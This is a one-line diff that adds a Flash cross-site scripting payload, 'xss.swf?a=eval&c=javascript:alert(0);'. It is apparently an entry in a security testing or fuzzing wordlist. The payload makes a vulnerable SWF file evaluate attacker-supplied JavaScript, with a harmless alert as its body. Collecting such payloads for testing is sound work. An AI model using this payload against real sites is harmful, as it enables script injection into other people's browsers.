@@ -1,0 +1,1 @@
+xss.swf?a=eval&c=javascript:alert(0);
